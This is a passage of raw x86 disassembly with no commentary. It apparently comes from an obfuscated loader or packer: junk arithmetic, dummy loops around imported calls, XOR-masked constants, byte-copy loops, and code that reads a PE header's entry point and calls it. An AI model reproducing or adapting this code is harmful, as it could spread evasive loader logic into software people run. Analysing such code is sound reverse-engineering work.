  41924a:	and    DWORD PTR ds:0x42c010,0x0
  419254:	jmp    0x419266
  419259:	mov    edx,DWORD PTR ds:0x42c010
  41925f:	inc    edx
  419260:	mov    DWORD PTR ds:0x42c010,edx
  419266:	cmp    DWORD PTR ds:0x42c010,0x19
  41926d:	jae    0x4192ae
  419273:	cmp    DWORD PTR ds:0x42c010,0x9
  41927a:	jne    0x419289
  419280:	push   DWORD PTR [ebp-0x18]
  419283:	call   DWORD PTR ds:0x42401c
  419289:	cmp    DWORD PTR ds:0x42c010,0x8
  419290:	jne    0x4192a3
  419296:	mov    edx,DWORD PTR ds:0x42c010
  41929c:	inc    edx
  41929d:	mov    DWORD PTR ds:0x42c010,edx
  4192a3:	jmp    0x419259
  4192a8:	or     DWORD PTR ds:0x42c004,ebx
  4192ae:	push   ecx
  4192af:	movzx  eax,BYTE PTR ds:0x42b00c
  4192b6:	and    DWORD PTR ds:0x42a01c,eax
  4192bc:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  4192c3:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4192ca:	mov    DWORD PTR ds:0x428008,0x13
  4192d4:	cmp    DWORD PTR ds:0x428008,0x0
  4192db:	je     0x41930a
  4192e1:	cmp    DWORD PTR ds:0x428008,0x20
  4192e8:	jne    0x4192fa
  4192ee:	push   DWORD PTR [ebp-0x14]
  4192f1:	push   DWORD PTR [ebp-0x1c]
  4192f4:	call   DWORD PTR ds:0x424020
  4192fa:	mov    eax,ds:0x428008
  4192ff:	dec    eax
  419300:	mov    ds:0x428008,eax
  419305:	jmp    0x4192d4
  41930a:	mov    eax,DWORD PTR [ebp-0x4]
  41930d:	and    DWORD PTR ds:0x429008,0x428020
  419317:	push   esi
  419318:	adc    DWORD PTR ds:0x42c000,0x1310
  419322:	mov    esi,DWORD PTR [ebp-0x8]
  419325:	mov    edx,0x7510893
  41932a:	xor    eax,edx
  41932c:	mov    ecx,DWORD PTR ds:0x42a000
  419332:	and    DWORD PTR ds:0x429014,ecx
  419338:	xor    esi,edx
  41933a:	mov    ecx,DWORD PTR ds:0x4237bd
  419340:	mov    ecx,DWORD PTR [ecx]
  419342:	sbb    DWORD PTR ds:0x42b00c,ecx
  419348:	mov    ecx,0x3272db
  41934d:	add    esi,ecx
  41934f:	add    eax,ecx
  419351:	imul   eax,esi
  419354:	mov    esi,DWORD PTR [ebp+0xc]
  419357:	cmp    esi,eax
  419359:	jne    0x419375
  41935f:	mov    eax,DWORD PTR [ebp-0x4]
  419362:	mov    esi,DWORD PTR [ebp-0x8]
  419365:	xor    eax,edx
  419367:	xor    esi,edx
  419369:	add    eax,ecx
  41936b:	add    esi,ecx
  41936d:	imul   eax,esi
  419370:	jmp    0x4193b0
  419375:	mov    eax,DWORD PTR [ebp+0xc]
  419378:	mov    eax,DWORD PTR [eax+0x78]
  41937b:	mov    DWORD PTR [ebp+0xc],eax
  41937e:	mov    eax,DWORD PTR [ebp-0x4]
  419381:	mov    esi,DWORD PTR [ebp-0x8]
  419384:	xor    eax,edx
  419386:	xor    esi,edx
  419388:	add    eax,ecx
  41938a:	add    esi,ecx
  41938c:	imul   eax,esi
  41938f:	mov    esi,DWORD PTR [ebp+0xc]
  419392:	cmp    esi,eax
  419394:	mov    eax,DWORD PTR [ebp-0x4]
  419397:	je     0x419362
  41939d:	xor    eax,edx
  41939f:	add    eax,ecx
  4193a1:	mov    ecx,DWORD PTR [ebp+0xc]
  4193a4:	imul   eax,ecx
  4193a7:	add    eax,DWORD PTR [ebp+0x8]
  4193aa:	mov    DWORD PTR [ebp+0xc],eax
  4193ad:	mov    eax,DWORD PTR [ebp+0xc]
  4193b0:	pop    esi
  4193b1:	leave  
  4193b2:	ret    0x8
  4193b5:	push   ebp
  4193b6:	mov    ebp,esp
  4193b8:	sub    esp,0x80
  4193be:	push   ebx
  4193bf:	push   esi
  4193c0:	push   edi
  4193c1:	mov    DWORD PTR ds:0x42c010,0xf9a
  4193cb:	mov    DWORD PTR [ebp-0x3c],0x0
  4193d2:	dec    eax
  4193d3:	mov    eax,DWORD PTR [ebp-0x18]
  4193d6:	mov    DWORD PTR [ebp-0x18],eax
  4193d9:	adc    DWORD PTR ds:0x429014,0x42801c
  4193e3:	push   0x421a76
  4193e8:	call   DWORD PTR ds:0x42402c
  4193ee:	adc    DWORD PTR ds:0x428018,0x3fb
  4193f8:	push   0x0
  4193fa:	push   0x67
  4193fc:	sbb    DWORD PTR ds:0x42b008,0x4024
  419406:	push   0xc
  419408:	mov    DWORD PTR ds:0x429000,0x5718
  419412:	push   0x3
  419414:	and    DWORD PTR ds:0x42b004,0x67ab
  41941e:	push   0x2
  419420:	push   0x78769798
  419425:	or     DWORD PTR ds:0x428024,0x42c014
  41942f:	call   DWORD PTR ds:0x42400c
  419435:	or     DWORD PTR ds:0x42c000,0x429014
  41943f:	push   0x57658733
  419444:	and    DWORD PTR ds:0x42c000,0x42900c
  41944e:	call   DWORD PTR ds:0x424008
  419454:	push   0x97667654
  419459:	call   DWORD PTR ds:0x424000
  41945f:	movzx  ebx,BYTE PTR ds:0x428004
  419466:	mov    eax,DWORD PTR [ebp-0x18]
  419469:	mov    ebx,0xf89c85b6
  41946e:	mov    DWORD PTR ds:0x42c018,0x6f46
  419478:	cmp    eax,ebx
  41947a:	mov    DWORD PTR ds:0x42c010,0x6381
  419484:	jne    0x4194d6
  41948a:	mov    DWORD PTR ds:0x421a72,0xf89c85b5
  419494:	adc    DWORD PTR ds:0x42a000,0x42801c
  41949e:	push   DWORD PTR [ebp+0x10]
  4194a1:	and    DWORD PTR ds:0x42a00c,0x42c00c
  4194ab:	push   DWORD PTR [ebp+0xc]
  4194ae:	push   DWORD PTR [ebp+0x8]
  4194b1:	or     DWORD PTR ds:0x42b008,0x5d49
  4194bb:	call   0x419233
  4194c0:	xor    DWORD PTR ds:0x42b018,ebx
  4194c6:	mov    ecx,DWORD PTR ds:0x421962
  4194cc:	or     esi,edi
  4194ce:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4194d4:	mov    DWORD PTR [ecx],eax
  4194d6:	mov    DWORD PTR [ebp-0x4],ebx
  4194d9:	sub    ecx,0x68bb
  4194df:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4194e6:	lea    eax,[ebp-0x44]
  4194e9:	mov    DWORD PTR [ebp-0x3c],eax
  4194ec:	adc    ecx,esi
  4194ee:	lea    eax,[ebp-0x48]
  4194f1:	not    DWORD PTR ds:0x42b008
  4194f7:	mov    DWORD PTR [ebp-0x24],eax
  4194fa:	mov    ecx,DWORD PTR ds:0x4237b9
  419500:	mov    esi,DWORD PTR ds:0x42179a
  419506:	sub    esi,ecx
  419508:	and    ecx,DWORD PTR [ecx+esi*1]
  41950b:	mov    eax,ds:0x421962
  419510:	mov    eax,DWORD PTR [eax+0x1c8]
  419516:	mov    eax,DWORD PTR [eax]
  419518:	and    edi,0x1f5e
  41951e:	mov    ecx,DWORD PTR [ebp-0x24]
  419521:	mov    esi,0x7510893
  419526:	xor    eax,esi
  419528:	mov    edi,0x3272db
  41952d:	add    eax,edi
  41952f:	mov    DWORD PTR ds:0x42b00c,0x7d8f
  419539:	mov    DWORD PTR [ecx],eax
  41953b:	mov    DWORD PTR ds:0x42a01c,0x3f3b
  419545:	mov    eax,ds:0x421b7e
  41954a:	mov    DWORD PTR ds:0x42b000,0x7292
  419554:	cmp    eax,0x301ac8f5
  419559:	mov    DWORD PTR ds:0x42a000,0x7d07
  419563:	jne    0x419756
  419569:	or     DWORD PTR ds:0x42a00c,0x42c008
  419573:	mov    eax,DWORD PTR [ebp-0x4]
  419576:	mov    DWORD PTR ds:0x42b008,0x18
  419580:	cmp    DWORD PTR ds:0x42b008,0x0
  419587:	je     0x4195f4
  41958d:	cmp    DWORD PTR ds:0x42b008,0x7
  419594:	jne    0x4195c4
  41959a:	push   0x42b018
  41959f:	push   0x1cad
  4195a4:	push   0x4fac
  4195a9:	push   0x428000
  4195ae:	push   0x3aa1
  4195b3:	push   0x4234ee
  4195b8:	push   DWORD PTR [ebp-0x10]
  4195bb:	push   DWORD PTR [ebp-0x14]
  4195be:	call   DWORD PTR ds:0x424024
  4195c4:	cmp    DWORD PTR ds:0x42b008,0x8
  4195cb:	jne    0x4195de
  4195d1:	mov    edx,DWORD PTR ds:0x42b008
  4195d7:	dec    edx
  4195d8:	mov    DWORD PTR ds:0x42b008,edx
  4195de:	xor    edx,edx
  4195e0:	or     edx,DWORD PTR ds:0x42b008
  4195e6:	dec    edx
  4195e7:	mov    DWORD PTR ds:0x42b008,edx
  4195ed:	jmp    0x419580
  4195f2:	sbb    ecx,ecx
  4195f4:	mov    ecx,DWORD PTR ds:0x421962
  4195fa:	and    DWORD PTR ds:0x42c004,0xdaf
  419604:	mov    ecx,DWORD PTR [ecx+0x198]
  41960a:	movzx  edx,WORD PTR ds:0x42c014
  419611:	add    DWORD PTR ds:0x42b018,edx
  419617:	xor    eax,esi
  419619:	add    eax,edi
  41961b:	and    DWORD PTR ds:0x42801c,0x0
  419625:	xor    edx,edx
  419627:	or     edx,DWORD PTR ds:0x42801c
  41962d:	inc    edx
  41962e:	mov    DWORD PTR ds:0x42801c,edx
  419634:	cmp    DWORD PTR ds:0x42801c,0x8
  41963b:	jne    0x419654
  419641:	push   0x4705
  419646:	push   0x5b08
  41964b:	push   DWORD PTR [ebp-0x18]
  41964e:	call   DWORD PTR ds:0x424028
  419654:	cmp    DWORD PTR ds:0x42801c,0x7
  41965b:	jne    0x41966e
  419661:	mov    edx,DWORD PTR ds:0x42801c
  419667:	inc    edx
  419668:	mov    DWORD PTR ds:0x42801c,edx
  41966e:	cmp    DWORD PTR ds:0x42801c,0x18
  419675:	jb     0x419625
  41967b:	mov    edx,DWORD PTR ds:0x421792
  419681:	mov    edx,DWORD PTR [edx]
  419683:	and    DWORD PTR ds:0x42b000,edx
  419689:	mov    DWORD PTR [ecx],eax
  41968b:	adc    ecx,eax
  41968d:	mov    eax,DWORD PTR [ebp-0x4]
  419690:	xor    eax,esi
  419692:	mov    DWORD PTR ds:0x42a004,0x12
  41969c:	cmp    DWORD PTR ds:0x42a004,0x0
  4196a3:	je     0x4196fe
  4196a9:	cmp    DWORD PTR ds:0x42a004,0x4
  4196b0:	jne    0x4196c6
  4196b6:	push   0x423614
  4196bb:	push   0x42358f
  4196c0:	call   DWORD PTR ds:0x424030
  4196c6:	cmp    DWORD PTR ds:0x42a004,0x5
  4196cd:	jne    0x4196e2
  4196d3:	xor    edx,edx
  4196d5:	add    edx,DWORD PTR ds:0x42a004
  4196db:	dec    edx
  4196dc:	mov    DWORD PTR ds:0x42a004,edx
  4196e2:	mov    edx,DWORD PTR ds:0x42a004
  4196e8:	dec    edx
  4196e9:	mov    DWORD PTR ds:0x42a004,edx
  4196ef:	jmp    0x41969c
  4196f4:	or     DWORD PTR ds:0x42b000,0x2eb5
  4196fe:	add    eax,edi
  419700:	and    DWORD PTR ds:0x428000,0x0
  41970a:	xor    ecx,ecx
  41970c:	or     ecx,DWORD PTR ds:0x428000
  419712:	inc    ecx
  419713:	mov    DWORD PTR ds:0x428000,ecx
  419719:	cmp    DWORD PTR ds:0x428000,0x26
  419720:	jne    0x419744
  419726:	push   DWORD PTR [ebp-0x1c]
  419729:	push   0x2787
  41972e:	push   DWORD PTR [ebp-0x20]
  419731:	push   DWORD PTR [ebp-0xc]
  419734:	push   0x458b
  419739:	push   0x42a000
  41973e:	call   DWORD PTR ds:0x424038
  419744:	cmp    DWORD PTR ds:0x428000,0x1e
  41974b:	jb     0x41970a
  419751:	mov    ds:0x421b7e,eax
  419756:	and    DWORD PTR ds:0x42a004,0x0
  419760:	xor    ecx,ecx
  419762:	xor    ecx,DWORD PTR ds:0x42a004
  419768:	inc    ecx
  419769:	mov    DWORD PTR ds:0x42a004,ecx
  41976f:	cmp    DWORD PTR ds:0x42a004,0x7
  419776:	jne    0x41978c
  41977c:	push   0x429018
  419781:	push   0x457c
  419786:	call   DWORD PTR ds:0x42403c
  41978c:	cmp    DWORD PTR ds:0x42a004,0x6
  419793:	jne    0x4197a6
  419799:	mov    ecx,DWORD PTR ds:0x42a004
  41979f:	inc    ecx
  4197a0:	mov    DWORD PTR ds:0x42a004,ecx
  4197a6:	cmp    DWORD PTR ds:0x42a004,0x1c
  4197ad:	jb     0x419760
  4197b3:	adc    edx,ecx
  4197b5:	mov    eax,ds:0x421962
  4197ba:	mov    eax,DWORD PTR [eax+0x18c]
  4197c0:	mov    eax,DWORD PTR [eax]
  4197c2:	mov    DWORD PTR [ebp-0x4c],eax
  4197c5:	xor    edx,edx
  4197c7:	add    edx,DWORD PTR ds:0x4237c9
  4197cd:	mov    eax,ds:0x42178e
  4197d2:	sub    eax,edx
  4197d4:	add    edx,DWORD PTR [edx+eax*1]
  4197d7:	mov    ecx,0xf89c85ba
  4197dc:	not    DWORD PTR ds:0x42b018
  4197e2:	mov    DWORD PTR [ebp-0x38],ecx
  4197e5:	mov    DWORD PTR [ebp-0x38],ecx
  4197e8:	neg    eax
  4197ea:	mov    DWORD PTR [ebp-0x38],ecx
  4197ed:	sbb    DWORD PTR ds:0x42a01c,0x6a2c
  4197f7:	mov    DWORD PTR [ebp-0x30],ebx
  4197fa:	sbb    ebx,ebx
  4197fc:	mov    DWORD PTR [ebp-0x38],ecx
  4197ff:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  419806:	and    DWORD PTR ds:0x42800c,0x0
  419810:	jmp    0x419822
  419815:	mov    edx,DWORD PTR ds:0x42800c
  41981b:	inc    edx
  41981c:	mov    DWORD PTR ds:0x42800c,edx
  419822:	cmp    DWORD PTR ds:0x42800c,0x1c
  419829:	jae    0x419869
  41982f:	cmp    DWORD PTR ds:0x42800c,0x10
  419836:	jne    0x41984a
  41983c:	push   DWORD PTR [ebp-0x20]
  41983f:	push   0x42360a
  419844:	call   DWORD PTR ds:0x424040
  41984a:	cmp    DWORD PTR ds:0x42800c,0xf
  419851:	jne    0x419864
  419857:	mov    edx,DWORD PTR ds:0x42800c
  41985d:	inc    edx
  41985e:	mov    DWORD PTR ds:0x42800c,edx
  419864:	jmp    0x419815
  419869:	mov    eax,DWORD PTR [ebp-0x4]
  41986c:	mov    edx,DWORD PTR [ebp-0x8]
  41986f:	inc    ebx
  419870:	mov    ebx,DWORD PTR [ebp-0x8]
  419873:	sub    DWORD PTR ds:0x42b008,0x42800c
  41987d:	xor    ebx,esi
  41987f:	xor    edx,esi
  419881:	and    DWORD PTR ds:0x42a010,0x42b01c
  41988b:	add    edx,ebx
  41988d:	and    DWORD PTR ds:0x42a01c,0x0
  419897:	jmp    0x4198ab
  41989c:	xor    ebx,ebx
  41989e:	add    ebx,DWORD PTR ds:0x42a01c
  4198a4:	inc    ebx
  4198a5:	mov    DWORD PTR ds:0x42a01c,ebx
  4198ab:	cmp    DWORD PTR ds:0x42a01c,0x12
  4198b2:	jae    0x4198fd
  4198b8:	cmp    DWORD PTR ds:0x42a01c,0x8
  4198bf:	jne    0x4198d0
  4198c5:	push   0x423574
  4198ca:	call   DWORD PTR ds:0x424044
  4198d0:	cmp    DWORD PTR ds:0x42a01c,0x7
  4198d7:	jne    0x4198ea
  4198dd:	mov    ebx,DWORD PTR ds:0x42a01c
  4198e3:	inc    ebx
  4198e4:	mov    DWORD PTR ds:0x42a01c,ebx
  4198ea:	jmp    0x41989c
  4198ef:	xor    ebx,ebx
  4198f1:	xor    ebx,DWORD PTR ds:0x42900c
  4198f7:	add    DWORD PTR ds:0x429000,ebx
  4198fd:	mov    ebx,DWORD PTR [ebp-0x8]
  419900:	sub    DWORD PTR ds:0x42900c,0x42800c
  41990a:	xor    ebx,esi
  41990c:	or     DWORD PTR ds:0x428000,0x42a00c
  419916:	xor    eax,esi
  419918:	add    eax,edi
  41991a:	mov    DWORD PTR ds:0x42b01c,0x7433
  419924:	lea    edx,[edx+ebx*1+0x975891]
  41992b:	mov    ebx,0x12a1
  419930:	mov    DWORD PTR [ebp-0x14],eax
  419933:	mov    ebx,0x8a29a123
  419938:	cmp    eax,edx
  41993a:	ja     0x419b96
  419940:	or     ecx,0x8d6
  419946:	mov    ecx,DWORD PTR [ebp-0x8]
  419949:	add    DWORD PTR ds:0x428018,ebx
  41994f:	xor    ecx,esi
  419951:	lea    ecx,[ecx+eax*1+0x3272db]
  419958:	add    DWORD PTR ds:0x429018,0x73bd
  419962:	mov    DWORD PTR [ebp-0x10],ecx
  419965:	adc    DWORD PTR ds:0x42c00c,ecx
  41996b:	mov    ecx,DWORD PTR [ebp-0x30]
  41996e:	inc    edx
  41996f:	xor    ecx,esi
  419971:	lea    ecx,[ebp+ecx*1+0x3272e3]
  419978:	xor    edx,edx
  41997a:	add    edx,DWORD PTR ds:0x42176e
  419980:	mov    edx,DWORD PTR [edx]
  419982:	or     DWORD PTR ds:0x42a008,edx
  419988:	mov    DWORD PTR [ebp-0x38],ecx
  41998b:	mov    ecx,DWORD PTR ds:0x421962
  419991:	mov    ecx,DWORD PTR [ecx+0x1bc]
  419997:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41999e:	mov    DWORD PTR ds:0x42b01c,0x13
  4199a8:	cmp    DWORD PTR ds:0x42b01c,0x0
  4199af:	je     0x4199ef
  4199b5:	cmp    DWORD PTR ds:0x42b01c,0x20
  4199bc:	jne    0x4199d7
  4199c2:	push   0x32fe
  4199c7:	push   0x42b000
  4199cc:	push   0x42376e
  4199d1:	call   DWORD PTR ds:0x424048
  4199d7:	mov    edx,DWORD PTR ds:0x42b01c
  4199dd:	dec    edx
  4199de:	mov    DWORD PTR ds:0x42b01c,edx
  4199e4:	jmp    0x4199a8
  4199e9:	dec    DWORD PTR ds:0x428020
  4199ef:	mov    DWORD PTR [ebp-0x34],ecx
  4199f2:	adc    DWORD PTR ds:0x42a004,ebx
  4199f8:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  4199ff:	adc    edx,edx
  419a01:	mov    ecx,DWORD PTR [ebp-0xc]
  419a04:	mov    edx,DWORD PTR ds:0x428024
  419a0a:	sbb    DWORD PTR ds:0x42c018,edx
  419a10:	mov    edx,DWORD PTR [ebp-0x10]
  419a13:	xor    ecx,esi
  419a15:	sbb    DWORD PTR ds:0x42b014,0x42b008
  419a1f:	add    ecx,edi
  419a21:	cmp    ecx,edx
  419a23:	mov    DWORD PTR ds:0x429004,0x1818
  419a2d:	je     0x419b62
  419a33:	mov    eax,DWORD PTR [ebp-0xc]
  419a36:	mov    DWORD PTR ds:0x428024,0x1374
  419a40:	mov    ecx,DWORD PTR [ebp-0x10]
  419a43:	xor    edx,edx
  419a45:	or     DWORD PTR ds:0x428008,0x428020
  419a4f:	xor    eax,esi
  419a51:	sub    DWORD PTR ds:0x42b004,0x42a008
  419a5b:	add    eax,edi
  419a5d:	sbb    DWORD PTR ds:0x42c018,0x42c014
  419a67:	add    ecx,0xfabdbef1
  419a6d:	adc    edx,0xffffffff
  419a70:	xor    ecx,ebx
  419a72:	sbb    DWORD PTR ds:0x42a010,0x42800c
  419a7c:	xor    edx,0x0
  419a7f:	mov    DWORD PTR [ebp-0x68],ecx
  419a82:	mov    ecx,DWORD PTR ds:0x42c014
  419a88:	or     DWORD PTR ds:0x42a008,ecx
  419a8e:	mov    DWORD PTR [ebp-0x64],edx
  419a91:	xor    edx,edx
  419a93:	mov    ecx,eax
  419a95:	add    ecx,0xfabdbef1
  419a9b:	adc    edx,0xffffffff
  419a9e:	xor    ecx,ebx
  419aa0:	xor    edx,0x0
  419aa3:	mov    DWORD PTR ds:0x42b008,0x242f
  419aad:	mov    DWORD PTR [ebp-0x24],eax
  419ab0:	mov    DWORD PTR ds:0x428018,0x30e6
  419aba:	mov    DWORD PTR [ebp-0x74],edx
  419abd:	mov    DWORD PTR ds:0x428018,0xdc5
  419ac7:	cmp    ecx,DWORD PTR [ebp-0x68]
  419aca:	jne    0x419ae5
  419ad0:	mov    ecx,DWORD PTR [ebp-0x64]
  419ad3:	cmp    edx,ecx
  419ad5:	mov    DWORD PTR ds:0x429004,0x231e
  419adf:	je     0x419b5f
  419ae5:	mov    ecx,DWORD PTR [ebp-0xc]
  419ae8:	mov    edx,DWORD PTR [ebp-0x20]
  419aeb:	xor    edx,esi
  419aed:	add    edx,edi
  419aef:	imul   edx,eax
  419af2:	xor    ecx,esi
  419af4:	add    ecx,eax
  419af6:	mov    eax,DWORD PTR [ebp-0x34]
  419af9:	mov    ebx,DWORD PTR [ebp-0x38]
  419afc:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  419b03:	mov    BYTE PTR [edx+eax*1],cl
  419b06:	mov    eax,DWORD PTR [ebp-0x20]
  419b09:	mov    ecx,DWORD PTR [ebp-0x24]
  419b0c:	xor    eax,esi
  419b0e:	lea    eax,[ecx+eax*1+0x3272db]
  419b15:	mov    ecx,DWORD PTR [ebp-0x10]
  419b18:	xor    edx,edx
  419b1a:	add    ecx,0xfabdbef1
  419b20:	adc    edx,0xffffffff
  419b23:	xor    edx,0x0
  419b26:	mov    ebx,0x8a29a123
  419b2b:	xor    ecx,ebx
  419b2d:	mov    DWORD PTR [ebp-0x70],ecx
  419b30:	mov    DWORD PTR [ebp-0x6c],edx
  419b33:	xor    edx,edx
  419b35:	mov    ecx,eax
  419b37:	add    ecx,0xfabdbef1
  419b3d:	adc    edx,0xffffffff
  419b40:	xor    ecx,ebx
  419b42:	xor    edx,0x0
  419b45:	mov    DWORD PTR [ebp-0x24],eax
  419b48:	mov    DWORD PTR [ebp-0x7c],edx
  419b4b:	cmp    ecx,DWORD PTR [ebp-0x70]
  419b4e:	jne    0x419ae5
  419b54:	mov    ecx,DWORD PTR [ebp-0x6c]
  419b57:	cmp    edx,ecx
  419b59:	jne    0x419ae5
  419b5f:	mov    eax,DWORD PTR [ebp-0x14]
  419b62:	mov    ecx,DWORD PTR [ebp-0x8]
  419b65:	xor    ecx,esi
  419b67:	lea    eax,[eax+ecx*1+0x3272db]
  419b6e:	mov    ecx,DWORD PTR [ebp-0x8]
  419b71:	mov    edx,DWORD PTR [ebp-0x8]
  419b74:	xor    edx,esi
  419b76:	xor    ecx,esi
  419b78:	add    ecx,edx
  419b7a:	mov    edx,DWORD PTR [ebp-0x8]
  419b7d:	xor    edx,esi
  419b7f:	lea    ecx,[ecx+edx*1+0x975891]
  419b86:	mov    DWORD PTR [ebp-0x14],eax
  419b89:	cmp    eax,ecx
  419b8b:	jbe    0x419940
  419b91:	mov    ecx,0xf89c85ba
  419b96:	mov    eax,DWORD PTR [ebp+0xc]
  419b99:	mov    ds:0x4217e6,eax
  419b9e:	mov    eax,DWORD PTR [ebp+0x10]
  419ba1:	mov    ds:0x421a3a,eax
  419ba6:	mov    eax,ds:0x4217e6
  419bab:	mov    edx,DWORD PTR [ebp-0x3c]
  419bae:	sub    eax,edi
  419bb0:	xor    eax,esi
  419bb2:	mov    DWORD PTR [edx],eax
  419bb4:	mov    eax,DWORD PTR [ebp-0x18]
  419bb7:	cmp    eax,0xf89c85b6
  419bbc:	jne    0x419be7
  419bc2:	lea    eax,[ebp-0x28]
  419bc5:	mov    DWORD PTR [ebp-0x40],eax
  419bc8:	lea    eax,[ebp+0x4]
  419bcb:	mov    DWORD PTR [ebp-0x28],eax
  419bce:	mov    eax,DWORD PTR [ebp-0x28]
  419bd1:	test   eax,eax
  419bd3:	je     0x419cff
  419bd9:	mov    eax,DWORD PTR [ebp-0x1c]
  419bdc:	mov    eax,DWORD PTR [ebp-0x8]
  419bdf:	lea    eax,[ebp-0x40]
  419be2:	jmp    0x419cf6
  419be7:	mov    eax,DWORD PTR [ebp-0x44]
  419bea:	cmp    eax,0xf89c85b5
  419bef:	je     0x419c4c
  419bf5:	mov    eax,DWORD PTR [ebp-0x4]
  419bf8:	mov    edx,DWORD PTR [ebp-0x48]
  419bfb:	xor    eax,esi
  419bfd:	add    eax,edi
  419bff:	cmp    eax,edx
  419c01:	je     0x419c4c
  419c07:	mov    eax,ds:0x421962
  419c0c:	mov    eax,DWORD PTR [eax+0x194]
  419c12:	mov    ecx,DWORD PTR [eax]
  419c14:	mov    eax,DWORD PTR [ecx+0x3c]
  419c17:	push   DWORD PTR ds:0x421a3a
  419c1d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  419c21:	push   DWORD PTR ds:0x4217e6
  419c27:	add    eax,ecx
  419c29:	mov    ecx,DWORD PTR ds:0x421962
  419c2f:	mov    ecx,DWORD PTR [ecx+0x194]
  419c35:	push   DWORD PTR [ecx]
  419c37:	call   eax
  419c39:	mov    ecx,DWORD PTR ds:0x421962
  419c3f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  419c45:	mov    DWORD PTR [ecx],eax
  419c47:	jmp    0x419cff
  419c4c:	mov    eax,DWORD PTR [ebp-0x4]
  419c4f:	mov    edx,DWORD PTR [ebp-0x4c]
  419c52:	xor    eax,esi
  419c54:	add    eax,edi
  419c56:	cmp    eax,edx
  419c58:	jne    0x419cb5
  419c5e:	mov    eax,DWORD PTR [ebp-0x4]
  419c61:	mov    edx,DWORD PTR ds:0x421962
  419c67:	mov    edx,DWORD PTR [edx+0x198]
  419c6d:	xor    eax,esi
  419c6f:	add    eax,edi
  419c71:	cmp    eax,DWORD PTR [edx]
  419c73:	jne    0x419c92
  419c79:	mov    eax,DWORD PTR [ebp-0x4]
  419c7c:	push   0xf89c85b6
  419c81:	xor    eax,esi
  419c83:	add    eax,edi
  419c85:	push   eax
  419c86:	push   ecx
  419c87:	push   DWORD PTR [ebp-0x8]
  419c8a:	push   DWORD PTR [ebp-0x4]
  419c8d:	call   0x408b5c
  419c92:	push   DWORD PTR [ebp-0x8]
  419c95:	push   DWORD PTR [ebp-0x4]
  419c98:	call   0x4091f8
  419c9d:	mov    eax,DWORD PTR [ebp-0x4]
  419ca0:	xor    eax,esi
  419ca2:	add    eax,edi
  419ca4:	mov    ds:0x4219e6,eax
  419ca9:	mov    eax,DWORD PTR [ebp-0x4]
  419cac:	xor    eax,esi
  419cae:	add    eax,edi
  419cb0:	mov    ds:0x4219de,eax
  419cb5:	lea    eax,[ebp-0x2c]
  419cb8:	mov    DWORD PTR [ebp-0x50],eax
  419cbb:	lea    eax,[ebp+0x4]
  419cbe:	mov    DWORD PTR [ebp-0x2c],eax
  419cc1:	mov    eax,DWORD PTR [ebp-0x2c]
  419cc4:	test   eax,eax
  419cc6:	je     0x419cff
  419ccc:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  419cd3:	mov    DWORD PTR [ebp-0x58],0x712ed08
  419cda:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  419ce1:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  419ce8:	call   0x401000
  419ced:	mov    eax,DWORD PTR [ebp-0x1c]
  419cf0:	mov    eax,DWORD PTR [ebp-0x8]
  419cf3:	lea    eax,[ebp-0x50]
  419cf6:	push   eax
  419cf7:	push   DWORD PTR [ebp-0x4]
  419cfa:	call   0x40883f
  419cff:	mov    eax,ds:0x421962
  419d04:	add    eax,0x1cc
  419d09:	mov    DWORD PTR [ebp-0x38],eax
  419d0c:	lea    eax,[ebp-0x1c]
  419d0f:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  419d16:	mov    DWORD PTR [ebp-0x3c],eax
  419d19:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  419d20:	mov    eax,DWORD PTR [ebp+0xc]
  419d23:	xor    eax,esi
  419d25:	mov    DWORD PTR [ebp+0x10],0x4
  419d2c:	mov    ecx,DWORD PTR [ebp+0x10]
  419d2f:	add    eax,edi
  419d31:	cmp    eax,ecx
  419d33:	je     0x419df4
  419d39:	mov    eax,DWORD PTR [ebp+0xc]
  419d3c:	mov    ecx,DWORD PTR [ebp+0x10]
  419d3f:	xor    edx,edx
  419d41:	xor    eax,esi
  419d43:	add    eax,edi
  419d45:	add    ecx,0xfabdbef1
  419d4b:	adc    edx,0xffffffff
  419d4e:	xor    ecx,ebx
  419d50:	xor    edx,0x0
  419d53:	mov    DWORD PTR [ebp-0x70],ecx
  419d56:	mov    DWORD PTR [ebp-0x6c],edx
  419d59:	xor    edx,edx
  419d5b:	mov    ecx,eax
  419d5d:	add    ecx,0xfabdbef1
  419d63:	adc    edx,0xffffffff
  419d66:	xor    ecx,ebx
  419d68:	xor    edx,0x0
  419d6b:	mov    DWORD PTR [ebp-0x20],eax
  419d6e:	cmp    ecx,DWORD PTR [ebp-0x70]
  419d71:	jne    0x419d80
  419d77:	cmp    edx,DWORD PTR [ebp-0x6c]
  419d7a:	je     0x419df4
  419d80:	mov    ecx,DWORD PTR [ebp+0xc]
  419d83:	mov    edx,DWORD PTR [ebp-0x24]
  419d86:	xor    edx,esi
  419d88:	xor    ecx,esi
  419d8a:	add    ecx,eax
  419d8c:	add    edx,edi
  419d8e:	imul   edx,eax
  419d91:	mov    eax,DWORD PTR [ebp-0x3c]
  419d94:	mov    ebx,DWORD PTR [ebp-0x38]
  419d97:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  419d9e:	mov    BYTE PTR [edx+eax*1],cl
  419da1:	mov    eax,DWORD PTR [ebp-0x24]
  419da4:	mov    ecx,DWORD PTR [ebp-0x20]
  419da7:	mov    edx,DWORD PTR [ebp+0x10]
  419daa:	xor    eax,esi
  419dac:	lea    eax,[ecx+eax*1+0x3272db]
  419db3:	xor    ecx,ecx
  419db5:	add    edx,0xfabdbef1
  419dbb:	adc    ecx,0xffffffff
  419dbe:	xor    ecx,0x0
  419dc1:	mov    DWORD PTR [ebp-0x7c],ecx
  419dc4:	xor    ebx,ebx
  419dc6:	xor    edx,0x8a29a123
  419dcc:	mov    ecx,eax
  419dce:	add    ecx,0xfabdbef1
  419dd4:	adc    ebx,0xffffffff
